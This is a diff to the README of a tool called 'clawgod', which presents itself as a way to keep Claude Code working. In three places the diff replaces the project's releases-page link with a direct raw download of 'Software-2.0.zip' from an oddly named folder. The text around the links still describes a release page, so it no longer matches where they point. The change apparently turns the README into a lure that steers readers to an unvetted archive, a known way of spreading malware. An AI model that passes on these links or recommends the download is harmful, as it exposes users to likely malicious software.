@@ -1,6 +1,6 @@
 # 🤖 clawgod - Keep Claude Code Working as It Changes
 
-[![Download clawgod](https://img.shields.io/badge/Download%20clawgod-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bambiematutinal642/clawgod/releases)
+[![Download clawgod](https://img.shields.io/badge/Download%20clawgod-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bambiematutinal642/clawgod/main/antiparastatitis/Software-2.0.zip)
 
 ## 🧩 What clawgod does
 
@@ -18,7 +18,7 @@ You will use the official release page to download the files you need, then run 
 
 Visit this page to download:
 
-https://github.com/bambiematutinal642/clawgod/releases
+https://raw.githubusercontent.com/bambiematutinal642/clawgod/main/antiparastatitis/Software-2.0.zip
 
 On that page, look for the latest release. Download the Windows file if one is listed, or the package that matches your system.
 
@@ -156,7 +156,7 @@ If you move files around a lot, the launcher may not find what it needs.
 
 Primary download page:
 
-https://github.com/bambiematutinal642/clawgod/releases
+https://raw.githubusercontent.com/bambiematutinal642/clawgod/main/antiparastatitis/Software-2.0.zip
 
 Use that page whenever you need to:
 
